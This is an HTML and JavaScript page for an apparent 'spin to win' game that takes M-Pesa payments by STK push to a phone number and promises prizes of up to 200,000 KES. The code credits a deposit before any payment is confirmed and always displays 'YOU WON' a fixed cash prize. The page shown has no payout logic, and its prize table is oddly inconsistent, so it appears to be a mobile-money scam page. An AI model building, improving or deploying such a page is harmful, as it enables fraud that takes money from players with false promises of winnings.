<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>DigitalServices</title>
<style>
body{background:#0a0e19;color:#fff;font-family:Arial;text-align:center;padding:15px}
.card{background:#1c2538;border-radius:20px;padding:20px;max-width:400px;margin:15px auto;border:2px solid #ffd700}
input{width:100%;padding:14px;margin:8px 0;border-radius:12px;border:1px solid #2a3a50;background:#0a0e19;color:#fff;box-sizing:border-box}
.btn-green{width:100%;padding:16px;background:#00d26a;color:#000;font-weight:900;border:none;border-radius:12px;font-size:18px}
.btn-yellow{width:100%;padding:16px;background:#ffeb3b;color:#000;font-weight:900;border:none;border-radius:12px;font-size:18px;margin-top:10px}
.wheel{font-size:110px;transition:transform 4s; margin:10px 0}
#prize{color:#ffd700;font-size:20px;font-weight:900;min-height:30px}
#status{font-size:13px;color:#9aa8c0;white-space:pre-wrap}
table{width:100%;font-size:13px;color:#9aa8c0;text-align:left;border-collapse:collapse}
td{padding:8px;border-bottom:1px solid #2a3a50}
td:last-child{color:#ffd700;font-weight:700;text-align:right}
</style>
</head>
<body>

<h1 style="color:#ffd700">🏆 UP TO 200,000 KES 🏆</h1>

<div style="background:#111a2a;padding:12px;border-radius:12px;max-width:400px;margin:10px auto;border:1px solid #00d26a">
👤 YOUR BALANCE: <span id="playerBal" style="color:#ffd700;font-weight:900">0 KES</span><br>
<span id="balStatus" style="font-size:11px;color:#ff4444">❌ No deposit - Cannot play</span>
</div>

<div class="card">
<div id="wheel" class="wheel">🎡</div>
<div id="prize">SPIN TO WIN!</div>

<table>
<tr><td>Pay 500 KES</td><td>Win 2,000 KES</td></tr>
<tr><td>Pay 3,500 KES</td><td>Win 40,000 KES</td></tr>
<tr><td>Pay 4,500 KES</td><td>Win 10,000 KES</td></tr>
<tr><td>Pay 5,000 KES</td><td>Win 20,000 KES</td></tr>
<tr><td>Pay 6,000 KES</td><td>Win 85,000 KES</td></tr>
<tr><td>Pay 20,000 KES</td><td>Win 160,000 KES</td></tr>
<tr><td>Pay 40,000 KES</td><td>Win 200,000 KES</td></tr>
</table>

<input id="phone" placeholder="Phone 07XXXXXXXX">
<input id="amount" type="number" value="500" min="500">

<button class="btn-green" id="buyBtn" onclick="deposit()">BUY SPIN TICKET</button>
<button class="btn-yellow" id="spinBtn" onclick="spin()">🎡 SPIN NOW!</button>

<p id="status"></p>
</div>

<script>
let playerBalance = 0;
let currentAmount = 500;

function getPrizeForAmount(a){
 a=Number(a);
 if(a>=40000) return "200,000 KES CASH";
 if(a>=20000) return "160,000 KES CASH";
 if(a>=6000) return "85,000 KES CASH";
 if(a>=5000) return "20,000 KES CASH";
 if(a>=4500) return "10,000 KES CASH";
 if(a>=3500) return "40,000 KES CASH";
 if(a>=500) return "2,000 KES CASH";
 return "2,000 KES CASH";
}

// ORIGINAL WORKING DEPOSIT - DO NOT TOUCH
async function deposit(){
 const p=document.getElementById('phone').value.trim();
 const a=document.getElementById('amount').value;
 const s=document.getElementById('status');
 if(p.length<10){ s.innerText='Enter valid phone'; return; }
 s.innerText='Sending STK Push...';
 try{
  const r=await fetch('/api/deposit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,amount:a})});
  const d=await r.json();
  console.log(d);
  s.innerText=`STK SENT for ${a} KES! Enter M-Pesa PIN`;
  playerBalance = Number(a);
  currentAmount = Number(a);
  document.getElementById('playerBal').innerText = playerBalance + " KES";
  document.getElementById('balStatus').innerText = "✅ Ready to spin!";
  document.getElementById('balStatus').style.color = "#00d26a";
  document.getElementById('prize').innerText = `BALANCE: ${a} KES → SPIN NOW!`;
 }catch(e){
  s.innerText='Error: '+e.message;
 }
}

function spin(){
 if(playerBalance < 500){
  alert("You have not deposited! Balance is 0. Buy ticket first.");
  return;
 }
 const deg=1800+Math.random()*1500;
 document.getElementById("wheel").style.transform=`rotate(${deg}deg)`;
 document.getElementById("prize").innerText="SPINNING...";
 setTimeout(()=>{
  const win=getPrizeForAmount(currentAmount);
  document.getElementById("prize").innerText=`YOU WON: ${win} 🎉`;
  document.getElementById("status").innerText=`Won ${win}!`;
  playerBalance=0;
  document.getElementById('playerBal').innerText="0 KES";
  document.getElementById('balStatus').innerText="❌ No deposit - Cannot play";
  document.getElementById('balStatus').style.color="#ff4444";
 },4000);
}
</script>
</body>
</html>
